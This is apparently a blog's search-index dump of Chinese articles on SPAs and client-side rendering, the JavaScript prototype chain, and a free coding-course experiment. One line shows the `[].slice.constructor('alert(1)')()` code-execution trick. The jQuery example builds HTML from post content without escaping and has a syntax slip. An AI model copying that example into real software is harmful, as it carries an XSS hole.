JS-Sorting-Algorithm/7.heapSort.md 用 JavaScript 學習資料結構和演算法：排序（Sort）與搜尋（Search）篇","link":"/2017/08/27/review-the-classical-sort-algorithm-with-javascript/"},{"title":"前後端分離與 SPA","text":"前言 這篇的原文（你走你的陽關道，我走我的獨木橋：前後端分離）是我之前在 iT 邦幫忙鐵人賽的其中一篇文章，寫完之後有陸陸續續收到一些回饋，就想說可以重新整理一下這篇文章，讓它變得再更清楚一點。 如果你有以下疑惑的話，這篇文章非常適合你： 為什麼前端會有 MVC？ 前端 MVC 跟後端 MVC 有什麼不一樣？ 為什麼要有 SPA（Single Page Application）？ （其實關於 MVC 到底是什麼就有很多討論了，但因為這篇文章的重點不在於此，所以對這方面就不多加描述，有興趣的朋友們可參考：MVC是一個巨大誤會） 先從你熟悉的流程開始 如果你要寫一個簡易的部落格，你會怎麼做？ 這答案很簡單嘛，可以先挑一個喜歡的框架，例如說 Rails、Laravel 等等，然後先定義好幾個 URL，再把 DB 的 Schema 想好，最後開始動手 coding。 例如說首頁的部分就是去 DB 把所有文章都撈回來，然後把資料丟到 view 裡面去 render，搞定！ 總而言之，流程大概是這樣： 當你想要訪問文章列表這個頁面的時候，瀏覽器會送 request 到 server，然後經過 controller 與 model，最後把資料帶給 view。 view 再回傳一份完整的 HTML 檔案（這個動作就叫做 render），而瀏覽器拿到之後，只要顯示出來就好。因為 render 在 server side，所以這也叫做 server side render。 這個流程照理來說，應該會是你最熟悉的流程，因為一大堆網頁都是這個樣子做的。 在這個狀況底下，一個只負責前端的工程師，基本上就是負責 view 這個資料夾底下的所有東西，必須用框架提供的 template 把資料跟 HTML 整合在一起。而當他需要 debug 的時候，必須要把整個專案都跑起來，才能看到畫面輸出的結果。 這樣的工作流程讓前後端切得沒有那麼開，畢竟前端工程師還需要會跑 rails，需要設定 DB，搞不好還要會設定 nginx！ 現在的方法雖然把資料（Model）跟顯示（View）切開了，但都還是在後端，有沒有更好的方法呢？有沒有辦法，讓後端專注在提供資料，前端專注在顯示資料呢？ 有！ client side render 剛剛我們提到了 server side render，由後端直接回傳整份 HTML，瀏覽器直接顯示就好，因為 response 就是完整的網頁了。 但既然會特別區分 server 跟 client，就代表還有一種方式叫做 client side render，這又是什麼呢？ 大家都知道，JavaScript 可以動態的產生內容，而 client side render 指的就是當前端拿到資料以後，才用 JavaScript 動態的把那些內容填到網頁上面。 直接拿程式碼出來說明，大家會比較好理解一點。 首先，我們的 server 現在就只專注在提供資料，所以就開一個 API 出來： 12345678910111213141516// 首頁，直接輸出所有留言app.get('/', function (req, res) &#123; // 從資料庫拿出所有的留言 db.getPosts(function (err, posts) &#123; if (err) &#123; res.send(err); &#125; else &#123; // 直接把所有 posts 丟出去 res.send(&#123; posts: posts &#125;); &#125; &#125;)&#125;); 如果用瀏覽器打開這個 API 的網址，應該會看到 JSON 格式的資料： 12345678910111213141516&#123; \"posts\": [ &#123; \"_id\": \"585f662a77467405888b3bbe\", \"author\": \"huli\", \"content\": \"2222\", \"createTime\": \"2016-12-25T06:24:42.990Z\" &#125;, &#123; \"_id\": \"585f662777467405888b3bbd\", \"author\": \"huli\", \"content\": \"1111\", \"createTime\": \"2016-12-25T06:24:39.601Z\" &#125; ]&#125; 後端的部分已經準備就緒，順利地提供資料了，再來我們來看前端，只需要一個index.html就可以了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" /&gt; &lt;script src=\"https://code.jquery.com/jquery-1.12.4.min.js\"&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function() &#123; getPosts(); &#125;) // ajax 抓取文章 function getPosts() &#123; $.ajax(&#123; url: 'http://localhost:3000/', success: function(response) &#123; if (!response.posts) &#123; return alert('Error'); &#125; for(var i = 0; i &lt; response.posts.length; i++) &#123; // 丟給 render function addPost(response.posts[i]); &#125; &#125;, error: function(err) &#123; console.log(err); alert('抓取失敗'); &#125; &#125;) &#125; function addPost(post) &#123; var item = '' + '&lt;div class=\"panel panel-default\"&gt;' + '&lt;div class=\"panel-heading\"&gt;' + '&lt;h3 class=\"panel-title\"&gt;' + post.author +', 發佈時間：' + post.createTime + '&lt;/h3&gt;' + '&lt;/div&gt;' + '&lt;div class=\"panel-body\"&gt;' + post.content '&lt;/div&gt;' + '&lt;/div&gt;'; $('.posts').append(item); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;a class=\"btn btn-primary\" href=\"/posts\"&gt;發表新留言&lt;/a&gt; &lt;h2&gt;留言列表&lt;/h2&gt; &lt;div class=\"posts\"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 接著打開 index.html，就可以看到預期中的畫面出現了，跟我們之前用 server side render 產生的畫面應該一模一樣。用右鍵 -&gt; 檢查去檢視，會發現所有元素都在。 但是如果你改用右鍵 -&gt; 檢視原始碼，會發現幾乎是空的： 這個就是 client side render 跟 server side render 最大的差別。因為對於前者，我們是在執行期間「動態」去跟後端伺服器拿資料，再動態產生你看到的那些元素。 而那些元素原本不存在 index.html 裡面，是我們後來自己用 jQuery append 上去的，所以檢視原始碼當然不會出現任何東西。 我們來看一張 client side render 的示意圖： 在 server side 的地方，view 這層直接被忽略了，因為後端只輸出 JSON 格式的資料而已，而這邊的第五步：把傳回來的資料 render 成 HTML 指的就是我們上面那個用 jQuery 動態 append 上去的步驟。 而在這種狀況底下，你有沒有發現前後端已經切開了？ 後端工程師從此之後不用再管 view 裡面到底裝什麼，不用再教前端工程師怎麼跑 rails，他只要負責制定 API 文件，提供前端需要的資料就好。 而前端工程師也不需要跑那些服務了，只需要用他們最熟悉的瀏覽器打開 HTML 檔案就行了，利用 ajax 從後端拿資料，並且在自己這邊用 JavaScript 動態產生內容。 在這種情況下，前後端的部署也可以完全拆開，前端的部分最簡單，只需要隨便找一個可以放 html 檔案的地方就好，例如說 Amazon S3。所以前端幾乎不會有掛掉的問題，也不會有流量的問題，因為它只是個靜態檔案而已。 假如 server 有一天掛了，API 也跟著掛了，使用者依然可以造訪網頁，只是看不到資料而已，或者是你可以顯示出一個錯誤的圖案。但如果是舊的那種綁在一起的架構，server 一旦掛掉，你連畫面都渲染不出來。 再者，因為現在把 data 跟 view 完全切開來，你要替換任何一邊都是很方便的。例如說你後端不想用 rails 了你要用 go，完全沒問題！只要保持 API 的格式一樣，你後端就算要用 C 也沒人管你。 前端也是一樣，你要選 Angular，選 React 或是選 Vue 甚至你要手刻都可以，反正都不關後端工程師的事情。 可是，事情沒那麼簡單 雖然這種場景聽起來很美好，但千萬不要忽略了這樣子的改變會造成的後果。 什麼後果？那就是前端會變得有夠複雜。 仔細想想我們一開始提到的那種開發架構，統一從後端 render，所以我一個頁面就準備一個 view 的檔案，如果使用者訪問/posts，我就render('posts.ejs')；若是訪問/about，我就render('about.ejs')。 第一個問題來了： 既然剛剛說前端只有一個 index.html，那不就代表使用者訪問 /posts跟訪問/about，都是到同一個檔案？那我要怎麼渲染不同頁面？ 因為在以往，路由的部分是 server 負責，就如同我上面說的一樣，server 依據不同的路由來決定要渲染哪一個頁面。可是現在切開之後，前端只剩下一個 index.html 了，那怎麼辦呢？ 只好讓前端來負責了。 前端可以透過window.location或者是 history API 來管理網址，就可以知道使用者現在想要造訪哪一個頁面。 這邊有一個小細節稍微提一下，那就是剛剛講過前端只有一個 html 檔案，所以網址可能像是這樣：https://example.com/index.html。 只有一個網址而已，怎麼知道使用者要造訪哪一個頁面？ 在以前我們要造訪posts的話，網址可能會是：https://example.com/posts，可是現在我們前端已經變成一個靜態檔案了，只有那一個路徑而已，該怎麼做呢？ 第一種方法是利用 hash，例如說https://example.com/index.html#posts，前端再去解析後面的字串。 第二種是利用nginx或其他類似的服務，把所有https://example.com/*的網址都一律輸出 index.html 這個檔案，這樣子看起來就會跟以前一樣了。 我到/posts，server 會回傳 index.html，我到/about server 也會回傳一樣的內容。 但總之呢，因為後端不再處理這邊的路由了，所以這個部分完全轉交給前端負責，你必須在前端自己管理 URL 的狀態，去決定現在要顯示哪一個頁面。 那這邊要怎麼做呢？最簡單的方法就是跟以往後端做法一樣，你到哪一個網址，我就根據網址輸出怎樣的東西。 前端的程式碼大概會長這樣： 123456789function render(path) &#123; // 清空整個畫面 $(body).empty(); if (path === 'posts') &#123; renderPostsPage(); &#125; else if (path === 'about') &#123; renderAboutPage(); &#125;&#125; 只要每一次到一個新的網址，我就把現在內容全部清空再渲染一次就好。 是很簡單沒錯，但是效能有大大的問題，因為有些部分你其實根本不用清空。例如說網站最上方會有的導覽列跟最下面的 footer，基本上每一個頁面都有，是不會變的。 針對那些不變的部分，應該保留起來才對，不然每一次都清空重建一樣的東西很沒有效率。你可能會說這不就跟後端以前寫 view 一樣，抽出共通的部分然後放在 layout 裡面之類的。 不不，這不一樣。後端 render 本質上就是「每一個不同頁面就回傳一份不同的 html 檔案」，而我們現在前端 render 其實也有把共通的部分抽出來，但前端的難題在：「要怎麼只更新部分畫面，而不是暴力的每次都砍掉重練」。 你有沒有開始漸漸覺得前端越來越多事情要做了？ Single Page Application 當你把這種東西發揮到極致，會覺得很像在寫一個 App 一樣，這東西就叫做 SPA，Single Page Application。 就如同字面上的意思一樣，我們現在只有一個 index.html 檔案，但是用起來卻像一個 App。 最經典的例子就是 Gmail。你在用 Gmail 的時候，完全沒有換頁。全部的動作都是在「同一個頁面」上面發生的，所以你載入的檔案從頭到尾就只有一個 index.html，完全沒有換過。 你在 Gmail 上面做的任何動作，都是用 ajax 發 request 給 server，server 回傳資料以後 client 端再用 JavaScript 把畫面 render 出來。 所以你在用 Gmail 的時候，會感覺好像在用一個 App 而不是在用網頁，因為頁面之間的跳轉很流暢，不像一般網頁中間可能會有白屏出現。 既然都叫做 Application 了，這時候的前端工程師已經不是大家以往想像的那樣，只需要會 HTML 跟 CSS 刻刻畫面，用 JavaScript 做點小特效跟互動。 要寫 SPA 的話，最難的就是狀態的管理。因為很多東西以前後端都幫你做掉了，所以你完全不用考慮這件事，但現在要了。 舉個例子好了，以前你訪問一篇文章，假設是/post/12，一點下去之後快速切回首頁再點擊其他文章，server 也就只是再回傳相對應的 HTML 而已。 可是呢，SPA 就不一樣了，考慮一下下面的流程： 使用者點擊/post/12 query API 使用者返回首頁 使用者點擊/posts/13 query API 拿到 response，渲染頁面 假設使用者點擊的速度很快，在第七步的時候，很有可能會先拿到第二步的 response，就會發生使用者明明點進去 A 文章，內容卻是 B 文章的狀況。 這只是一個簡單的例子，實戰上還有一大堆要考慮的問題，例如說還沒有拿到資料的時候要顯示什麼，拿到之後要怎麼更新等等。 前端 MVC 在前端變得愈來愈複雜之後，你應該也能理解為什麼前端需要 MVC 了。如果你有寫過純 PHP，經歷過那種商業邏輯跟 view 跟 model 混雜在同一個檔案的時期，應該也很能理解為什麼需要 MVC。 因為我們要把職責切開來嘛，讓大家各自負責該負責的東西，才不會全部混在一起變成義大利麵。 前端 MVC 其實跟後端 MVC 滿類似，然後前端也要設定路由，剛剛有提過了。就是設定哪一個 URL 要去哪一個 Controller，再去相對應的 Model 拿資料，最後輸出 View。 這邊稍微比較一下前後端的 MVC 在做的事情： 前端 後端 Model 去跟後端 API 拿資料 去跟 DB 拿資料 View 在前端動態產生畫面 無 Controller 呼叫相對應的 Model 並 render 畫面 呼叫相對應的 Model 並傳回資料 你會發現其實前後端做的事情都差不多，只是前端注重在 render 畫面，後端注重在輸出資料。還可以畫出這一張完整的流程圖： 用文字來解釋的話，流程是這樣的： 使用者造訪 /posts 這個網址，代表他想看全部文章 前端的路由去處理，負責呼叫對應到的 controller 前端 controller 去呼叫 Model 拿資料 前端 Model 透過 API，去 /api/posts 這個網址拿資料 後端路由接到 request，丟給對應到的後端 controller 後端 controller 跟後端 Model 拿資料 後端 controller 把資料傳回去 前端 Modle 拿到資料以後回傳給前端 controller，並且把資料丟給 view client side render，把畫面渲染出來 你上面看到的這整套，大概就是最基本的 SPA 的架構了。後端只負責輸出資料，前端來負責抓資料跟渲染畫面。把前後端完完全全的切開了，就算你後端壞掉，你前端還是看得到畫面（只是可能會顯示個錯誤畫面之類的）；你前端壞掉，後端還是能安穩的輸出資料供其他服務使用。 兩邊乾乾淨淨，而且任何一邊都會比較好維護，前端工程師想要改任何跟介面有關的東西，都跟後端完全沒有關係，其實就等於是兩個不同的專案的意思。 我們真的需要 SPA 嗎？ 上面提到了這麼多，我認為前端開發的複雜化跟 SPA 有滿大的關係，畢竟你現在就等於是在開發一個完整的 App，怎麼可能不複雜？ 可是別忘記問自己： 我們真的需要 SPA 嗎？ 有些場景是一定要用的，例如說音樂播放網站。 為什麼？因為你必須一邊播放音樂，一邊讓他可以在網站上看其他的資料，例如說歌手介紹、專輯介紹之類的。如果你今天不是用 SPA，那使用者點到別的頁面的時候，瀏覽器就跳頁了，音樂就停了。哇靠這個體驗也太差了，完全不能接受。 所以這種網站一定要用 SPA，沒有其他選擇。用了之後因為不會跳頁，所以你點擊歌手介紹的時候，只是發一個 ajax request，然後收到 response 之後用 JavaScript 把接收到的資料 render 成 HTML 顯示出來。不管到哪一個頁面，都不會真的跳轉，不會載入新的 HTML 檔案。 那有些地方我覺得不用也行，但用了之後可以加強使用者體驗，例如說 Twitch 前一陣子的新功能，在你跳去看其他頁面的時候，你原本在看的實況會縮到左下角。 總之，會需要用到 Single Page Application 的場合有兩個，一個是因為必須要這樣做，另一個是因為可以增進使用者體驗，讓使用者覺得操作起來更順暢。 如果你發現你要做的東西不符合這兩種場合，你可以選擇不要做 SPA，可以選擇就依照之前那樣的 MVC 架構，由 server side 去 render、去處理。這一切都是可以選擇的。 除此之外，其實 SPA 也有一些缺點，例如說你明明只要看一個頁面而已，卻要把一大包的 JavaScript 或是其他頁面的 template 一起下載下來。 又或者因為是 client side render，所以有些搜尋引擎爬不到任何資料（因為你的 index.html 幾乎是空的），不過 Google 很厲害，會爬 JavaScript 執行完之後的結果。可是這對 SEO 來說還是不太好。 當然上面都有一些方法可以解決啦，例如說可以把 js 檔案分開，你到那一個頁面就只要下載那一個頁面的 js 即可。SEO 的解決方法則是將兩種結合，第一次先在 server side render，之後的操作都改用 client side render，就可以保證搜尋引擎也能爬到完整的 HTML。 但你知道的，可以解決是一回事，要花多少心力去解決又是另外一回事了。 總結 這篇大概講到了一開始最常見的網站架構，然後到近期導致前端開發複雜化的 SPA。我以前剛接觸的時候也是一頭霧水，想說到底前端為什麼需要 MVC。可是經過這一連串的脈絡思考下來，就很能理解原因了。 當你東西變得愈來愈複雜，就需要一個架構去把職責切割開來，不然會造成日後維護上的困難。 當你越瞭解 SPA 所帶來的優缺點，你在選擇要不要用的時候就有更多面向可以參考，就有更多的理由去支持你所做的決定，而不單單僅是「哇！好潮喔！別人用了我也要用！」 希望這篇對大家有幫助，最後附上一篇延伸閱讀：Why I hate your Single Page App","link":"/2017/09/06/spa-single-page-application/"},{"title":"該來理解 JavaScript 的原型鍊了","text":"前言 老實說 JavaScript 的原型鍊一直是我很懼怕的一個主題，理由很簡單，因為真的不太好理解。光是一堆名詞跟錯綜複雜的關係就可以把你搞瘋，例如說prototype, __proto__, constructor, Object.prototype, Function.prototype, new等等。 可是呢，這又確實是 JavaScript 很重要的一部分，而且是面試的必考題，就算現在不懂，以後遲早有一天要把它弄懂，不然的話永遠都沒辦法把自己的技術能力往上提高一個檔次。 有關原型鍊的文章你可以在網路上搜到一大堆，每一篇的理解方式都不太一樣，有些直接搬出一大堆專有名詞，嚇都把你嚇死了。而我也是一直到最近，看了幾篇我覺得切入角度比較不錯的文章，才真正對原型鍊有比較深刻的理解。 就趁著現在這個機會，讓我們多瞭解一點 JavaScript 的原型鍊吧！這篇適合對 JavaScript 有一點概念但又不是很清楚的人觀看，如果文章中有講錯的地方，也麻煩不吝在評論中指出，感謝。 JavaScript 中的 class 要理解原型鍊，可以先從這兩篇我覺得很棒的切入角度開始： Javascript继承机制的设计思想 从设计初衷解释 JavaScript 原型链 這兩篇講到為什麼當初 JavaScript 的機制是這樣設計的，我認為從這個角度開始理解，會是一個比較好的開始。（強烈建議先看過這兩篇之後再往下看，會幫助你更瞭解原型鍊到底是什麼東西） 首先呢，JavaScript 不像 Java 或是其他物件導向的程式語言，它是沒有 class 的（ES6 的 class 也只是語法糖而已）。可是儘管沒有 class，卻還是可以設計出一個類似的機制來達成差不多的功能。 在 Java 裡面，如果你要從 class 生出一個 instance 的話，你可以這樣寫： 1Point p = new Point(); 於是 JavaScript 就把這個語法拿來用，有了new這個關鍵字。可是 JavaScript 又沒有 class，new後面要接什麼呢？ 這時候他就想到，每一個 class 在初始化的時候，不是都會呼叫 constructor 嗎？也就是構造函數，那在 JavaScript 裡面，後面就接構造函數吧！ 於是，下面的程式碼就很好理解了： 12345678// constructorfunction Person(name, age) &#123; this.name = name; this.age = age;&#125; var nick = new Person('nick', 18);var peter = new Person('peter', 18); 就如同上面講到的一樣，Person就是一個構造函數，可以用new這個關鍵字 new 出一個 instance 來。 如果你只看下面宣告 nick 那一行（var nick = new Person('nick', 18);），語法是不是跟你在寫 Java 的時候有 87 分像？除此之外，你也可以幫Person加入一些方法。 12345678910111213function Person(name, age) &#123; this.name = name; this.age = age; this.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125;&#125; var nick = new Person('nick', 18);nick.log(); // nick, age:18 var peter = new Person('peter', 20);peter.log(); // peter, age:20 可是這樣其實還有一個小問題， name 跟 age 這兩個屬性，很明顯是每一個 instance 都會不一樣的。可是 log 這個 method，其實是每一個 instance 彼此之間可以共享的，因為都在做同一件事情。 在現在這種情況下，雖然 nick 的 log 這個 function 跟 peter 的 log 這個 function 是在做同一件事，但其實還是佔用了兩份空間，意思就是他們其實是兩個不同的 function。 123456789101112function Person(name, age) &#123; this.name = name; this.age = age; this.log = function () &#123; console.log(this.name + ', age:' + this.age); &#125;&#125; var nick = new Person('nick', 18);var peter = new Person('peter', 20); console.log(nick.log === peter.log) // false 那怎麼辦呢？我們可以把這個 function 抽出來，變成所有 Person 都可以共享的方法。講到這邊，你應該有聽過一個東西叫做prototype。只要把 log 這個 function 指定在 Person.prototype 上面，所有 Person 的 instance 都可以共享這個方法。 1234567891011121314151617function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18);var peter = new Person('peter', 20); console.log(nick.log === peter.log) // true // 功能依舊跟之前一樣nick.log(); // nick, age:18peter.log(); // peter, age:20 有些人會直接在 Array.prototype 上面加一些函式，讓自己可以更方便地做一些操作，原理也是這樣。可是一般來說，不推薦直接去修改不屬於你的 Object。 12345Array.prototype.last = function () &#123; return this[this.length - 1];&#125;; console.log([1,2,3].last()) // 3 最後幫大家總結一下，上面這一段其實主要是幫大家複習一下 JavaScript 的一些基礎。 你有一個叫做Person的函數，就可以把Person當作 constructor，利用var obj = new Person()來 new 出一個Person的 instance，並且可以在Person.prototype上面加上你想讓所有 instance 共享的屬性或是方法。 探究原理 不知道你會不會好奇一件事，以上面var nick = new Person('nick', 18);的例子來說，當我在呼叫nick.log()的時候，JavaScript 是怎麼找到這個 function 的？ 因為 nick 這個 instance 本身並沒有 log 這個 function。但根據 JavaScript 的機制，nick 是 Person 的 instance，所以如果在 nick 本身找不到，它會試著從Person.prototype去找。 可是，JavaScript 怎麼知道要到這邊去找？所以一定是 nick 跟Person.prototype會透過某種方式連接起來，才知道說要往哪邊去找 log 這個 function。 而這個連接的方式，就是__proto__。 （附註：其實比較好的方式是用Object.getPrototypeOf()，但這邊為了方便起見，還是使用比較常見的__proto__，更詳細的說明可參考：MDN: Object.prototype.proto） 123456789101112function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18); console.log(nick.__proto__ === Person.prototype) // true nick 的__proto__會指向Person.prototype，所以在發現 nick 沒有 log 這個 method 的時候，JavaScript 就會試著透過__proto__找到Person.prototype，去看Person.prototype裡面有沒有 log 這個 method。 那假如Person.prototype還是沒有呢？那就繼續依照這個規則，去看Person.prototype.__proto__裡面有沒有 log 這個 method，就這樣一直不斷找下去。找到時候時候為止？找到某個東西的__proto__是 null 為止。意思就是這邊是最上層了。 而上面這一條透過__proto__不斷串起來的鍊，就叫做原型鍊。透過這一條原型鍊，就可以達成類似繼承的功能，可以呼叫自己 parent 的 method。 看下面這段程式碼你大概會有一些感覺： 12345678910111213141516171819function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18); // 這個剛講過了，nick.__proto__ 會指向 Person.prototypeconsole.log(nick.__proto__ === Person.prototype) // true // 那 Person.prototype.__proto__ 會指向誰呢？會指向 Object.prototypeconsole.log(Person.prototype.__proto__ === Object.prototype) // true // 那 Object.prototype.__proto__ 又會指向誰呢？會指向 null，這就是原型鍊的頂端了console.log(Object.prototype.__proto__) // null 如果想知道一個屬性是存在 instance 身上，還是存在於它屬於的原型鍊當中，可以用hasOwnProperty這個方法： 123456789101112function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18);console.log(nick.hasOwnProperty('log')); // falseconsole.log(nick.__proto__.hasOwnProperty('log')); // true 有了hasOwnProperty之後，我們就可以自己來模擬這段往上找的過程： 1234567891011121314151617181920212223242526272829function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18); function call(obj, methodName) &#123; var realMethodOwner = obj; // 不斷往上找，直到 null 或者是找到真的擁有這個 method 的人為止 while(realMethodOwner &amp;&amp; !realMethodOwner.hasOwnProperty(methodName)) &#123; realMethodOwner = realMethodOwner.__proto__; &#125; // 找不到就丟一個 error，否則執行這個 method if (!realMethodOwner) &#123; throw 'method not found.'; &#125; else &#123; realMethodOwner[methodName].apply(obj); &#125;&#125; call(nick, 'log'); // nick, age:18call(nick, 'not_exist'); // Uncaught method not found. 做到這邊，其實你已經對原型鍊有了比較深刻的了解了。 來考你一題，Person.__proto__會是什麼？ 1234567891011121314function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18); console.log(Person.__proto__ === Function.prototype); // trueconsole.log(Function.prototype.__proto__ === Object.prototype) // trueconsole.log(Object.prototype.__proto__); //null 因為Person其實就是個 Function 的 instance，所以Person.__proto__當然就是Function.prototype囉！ instanceof 顧名思義，A instanceof B 就是拿來判斷 A 是不是 B 的 instance，舉例來說： 1234567891011121314function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18); console.log(nick instanceof Person); // trueconsole.log(nick instanceof Object); // trueconsole.log(nick instanceof Array); // false 從範例中可以看出，只要能在 A 的原型鍊裡面找到 B 的 prototype，就會回傳 true。知道原理之後，我們也可以來簡單模擬一下 instnaceof 在做的事： 1234567891011121314151617181920212223function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18); function instanceOf(A, B) &#123; // 已經找完了 if (!A) return false; // 沒找到的話，繼續往上找 return A.__proto__ === B.prototype ? true : instanceOf(A.__proto__, B);&#125; console.log(instanceOf(nick, Person)); // trueconsole.log(instanceOf(nick, Object)); // trueconsole.log(instanceOf(nick, Array)); // false 而 instanceof 有一個很有趣的現象，那就是： 1234567891011// 這兩個互為彼此的 instanceconsole.log(Function instanceof Object); // trueconsole.log(Object instanceof Function); // true // Function 的 __proto__ 會指向 Function.prototype// 而 Function.prototype 的 __proto__ 會指向 Object.prototypeconsole.log(Function.__proto__ === Function.prototype); // trueconsole.log(Function.__proto__.__proto__ === Object.prototype); //true // Object 的 __proto__ 會指向 Function.prototypeconsole.log(Object.__proto__ === Function.prototype); // true 這個東西又會把問題搞得更複雜，在這邊就先不提了。如果想知道的話，可以參考下面這兩篇文章： 从__proto__和prototype来深入理解JS对象和原型链 理解JavaScript的原型链和继承 constructor 順帶一提，每一個 prototype 都會有一個叫做constructor的屬性，例如說Person.prototype.constructor，而這個屬性就會指向構造函數。Person.prototype的構造函數是什麼？當然就是Person囉。 123456789101112131415161718function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; var nick = new Person('nick', 18); // 這段是要讓大家知道，這邊其實是往原型鍊的上面去找console.log(nick.constructor === Person); // trueconsole.log(nick.hasOwnProperty('constructor')); // false // Person 的 constructor 就是 Personconsole.log(Person.prototype.constructor === Person); // trueconsole.log(Person.prototype.hasOwnProperty('constructor')); // true 所以其實constructor也沒什麼好講的，A.prototype.constructor === A，你把 A 用 Function, Person, Object 之類的值帶進去都成立。 有一個比較有趣的地方是，你可以透過這樣的方式來執行一段程式碼：[].slice.constructor('alert(1)')()。原理其實就是把Function('alert(1)')()的Function用[].slice.constructor來取代掉。 new 有了原型鍊的概念之後，就不難理解new這個關鍵字背後會做的事情是什麼。 假設現在有一行程式碼是：var nick = new Person('nick');，那它有以下幾件事情要做： 創出一個新的 object，我們叫它 O 把 O 的 __proto__ 指向 Person 的 prototype，才能繼承原型鍊 拿 O 當作 context，呼叫 Person 這個建構函式 回傳 O 我們可以寫一段程式碼來模擬這個情形： 123456789101112131415161718192021222324function Person(name, age) &#123; this.name = name; this.age = age;&#125; Person.prototype.log = function () &#123; console.log(this.name + ', age:' + this.age);&#125; function newObj(Constructor, arguments) &#123; var o = new Object(); // 讓 o 繼承原型鍊 o.__proto__ = Constructor.prototype; // 執行建構函式 Constructor.apply(o, arguments); // 回傳建立好的物件 return o;&#125; var nick = newObj(Person, ['nick', 18]);nick.log(); // nick, age:18 延伸閱讀：JS 对象机制深剖——new 运算符 總結 今天不但更理解了原型鍊到底是什麼東西，也寫了一些簡單的小程式來模擬 JavaScript 在查找原型鍊的過程。藉由自己實作這些機制之後，應該會對原型鍊有更多的一些理解。 在 JavaScript 這個程式語言當中，就是透過原型鍊這樣子的機制，把上下關係給串起來，當你在 A 找不到某個東西的時候，就可以到 A 的 parent（也就是 A.__proto__）去找，還是找不到的話就再往上。而原型鍊的盡頭就是Object.prototype，再往上找就是null了。 在寫這篇文章的時候參考了許多資料，我都附在下面了。有些文章會附上精美圖片，但我覺得從圖片開始反而會有點霧煞煞，因為不知道彼此之間的關聯是怎麼來的。 建議大家看完這篇之後可以看一下底下那些參考資料，也順便複習一下自己的觀念是否正確。 參考資料 JavaScript深入之从原型到原型链 JS原型链图解教程 理解JavaScript的原型链和继承 从__proto__和prototype来深入理解JS对象和原型链 Javascript 原型链 彻底理解JavaScript原型","link":"/2017/08/27/the-javascripts-prototype-chain/"},{"title":"一場三十人的免費程式教學實驗：成果與檢討","text":"緣起 在三個月前，我在 ptt 上 po 文（[分享] 免費程式教學(前端)），說我願意提供一系列的免費程式前端教學。只要是有網頁基礎的都能夠報名，歡迎大家寫信給我，並且附上幾個提問的回答，最後我會挑 5~10 個人進行培訓。 上面所指的提問如下： 自我介紹（例如說背景、怎麼學程式的、程式能力到哪） 學程式多久了，當初為什麼會想學程式 現在在工作嗎？是的話工作內容大概是什麼？ 最近碰到過的一個最難的程式問題 希望我可以給予哪方面的協助 那篇文章是 3/2 發出的，報名截止日期到 3/11，而 3/15 以前會寄信給被我錄取的人 先來講講當初為什麼會想要開這個免費程式教學吧！其實原文裡面也有寫了，我再講得更清楚一點 在這之前，其實我就曾經辦過類似的活動了，雖然也是程式教學，但其實來找我的都是毫無經驗的初學者，我能給的都是一些比較大方向的建議，例如說跟他們介紹什麼是前端、什麼是後端，介紹幾種程式語言，並且推薦給他們適合初學者的。 上一次教學大概接觸了十幾個人，可是卻幾乎沒有一個「真正碰到寫程式」，都僅止於「想學程式但又還沒開始」的階段 可是這不是我想要的，我想要的是實際讓學生們動手寫程式，並且驗證看看「我的方法」是不是真的有效，至於這個方法是什麼，我們稍後會提到。因此，我這次的教學才會把學生限定在「有前端程式基礎」，那代表我可以往更深的地方去教。 爆炸的信箱 文章 po 出之後在 ptt 上的迴響還行，大約是 30 幾個推，以軟體工作版這種比較小的板來說算多了。但事實上，報名的人數遠出乎我的意料。 到報名截止日期為止，我一共收到了 42 封信。 是我原本想收的人數的四到八倍左右（原本我只想收 5~10 個），而且有很多人都寫得很不錯。其實，從這些信件就可以看出每一個人的個性了，有些人比較懶，隨便寫個三四行就寄過來；有些人很認真，甚至還提供履歷或者是有精心排版。 那怎麼辦呢？我要怎麼從裡面篩出我要的人？ 算了，太麻煩了，乾脆就全收吧！ 沒錯，我真的是這麼想的。於是，拒絕掉真的不適合的 4 個人以後，最後錄取的有 38 人。 下面附上我當初寄給所有人的錄取通知： Hi, 收到這封信，就代表你已經錄取了。 但其實說「錄取」我自己也覺得有點怪啦，因為並不是什麼正式的活動，辦這個程式教學的初衷就純粹是我希望四五年前我剛接觸前後端網頁程式的時候，也有人能夠這樣帶著我，給我一些建議。 但那個人始終沒有出現，於是在四五年過後，我決定自己跳下來做那個人。 在寫程式的路上一樣受到了很多前輩們的幫助，Google 跟 Stackoverflow 也惠我良多，就是因為受過太多人的幫助，才讓我一直覺得「回饋」是一件我必須要做的事情。 前言差不多就到這邊了，這封信是統一回給大家的，接著會介紹一下之後這個活動的走向。 這次的報名比我想像中的踴躍，大約有 40 